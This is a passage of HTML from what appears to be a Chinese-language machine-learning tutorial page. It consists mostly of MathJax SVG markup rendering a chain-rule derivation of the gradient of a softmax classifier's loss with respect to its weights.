153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(1299,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g><g data-mml-node=\"msup\" transform=\"translate(2577.8,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D452\" d=\"M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z\"/></g><g data-mml-node=\"TeXAtom\" transform=\"translate(499,289) scale(0.707)\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D458\" d=\"M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z\"/></g></g></g></g></g><rect width=\"3977.6\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mspace\" transform=\"translate(13406,0)\"/><g data-mml-node=\"mo\" transform=\"translate(13683.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(14739.6,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(15839.1,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(16839.4,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(17339.4,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(17728.4,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(523,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(18823.1,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(19878.9,0)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(20290.9,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span> s对W求导： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.218ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"25.405ex\" height=\"5.542ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1469.2 11229 2449.5\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1121.1,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(2176.9,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(3298.1,0)\"><path data-c=\"22C5\" d=\"M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(3798.3,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(977,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(5394.4,0)\"><path data-c=\"21D2\" d=\"M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(6672.2,0)\"><g data-mml-node=\"mrow\" transform=\"translate(457.5,754.2)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D460\" d=\"M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(502,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(977,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g><rect width=\"2084.3\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(9274.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(10330,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(605,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g></g></svg></mjx-container></span> 根据链式法则： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.218ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"41.61ex\" height=\"5.542ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1469.2 18391.8 2449.5\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(375.2,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(714,-150) scale(0.707)\"><path data-c=\"1D456\" d=\"M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D44A\" d=\"M436 683Q450 683 486 682T553 680Q604 680 638 681T677 682Q695 682 695 674Q695 670 692 659Q687 641 683 639T661 637Q636 636 621 632T600 624T597 615Q597 603 613 377T629 138L631 141Q633 144 637 151T649 170T666 200T690 241T720 295T759 362Q863 546 877 572T892 604Q892 619 873 628T831 637Q817 637 817 647Q817 650 819 660Q823 676 825 679T839 682Q842 682 856 682T895 682T949 681Q1015 681 1034 683Q1048 683 1048 672Q1048 666 1045 655T1038 640T1028 637Q1006 637 988 631T958 617T939 600T927 584L923 578L754 282Q586 -14 585 -15Q579 -22 561 -22Q546 -22 542 -17Q539 -14 523 229T506 480L494 462Q472 425 366 239Q222 -13 220 -15T215 -19Q210 -22 197 -22Q178 -22 176 -15Q176 -12 154 304T131 622Q129 631 121 633T82 637H58Q51 644 51 648Q52 671 64 683H76Q118 680 176 680Q301 680 313 683H323Q329 677 329 674T327 656Q322 641 318 637H297Q236 634 232 620Q262 160 266 136L501 550L499 587Q496 629 489 632Q483 636 447 637Q428 637 422 639T416 648Q416 650 418 660Q419 664 420 669T421 676T424 680T428 682T436 683Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(977,-150) scale(0.707)\"><path data-c=\"1D457\" d=\"M297 596Q297 627 318 644T361 661Q378 661 389 651T403 623Q403 595 384 576T340 557Q322 557 310 567T297 596ZM288 376Q288 405 262 405Q240 405 220 393T185 362T161 325T144 293L137 279Q135 278 121 278H107Q101 284 101 286T105 299Q126 348 164 391T252 441Q253 441 260 441T272 442Q296 441 316 432Q341 418 354 401T367 348V332L318 133Q267 -67 264 -75Q246 -125 194 -164T75 -204Q25 -204 7 -183T-12 -137Q-12 -110 7 -91T53 -71Q70 -71 82 -81T95 -112Q95 -148 63 -167Q69 -168 77 -168Q111 -168 139 -140T182 -74L193 -32Q204 11 219 72T251 197T278 308T289 365Q289 372 288 376Z\"/></g></g></g><rect width=\"2084.3\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(2602.1,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(3657.9,0)\"><g data-mml-node=\"mrow\" transform=\"translate(220,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D43F\" d=\"M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 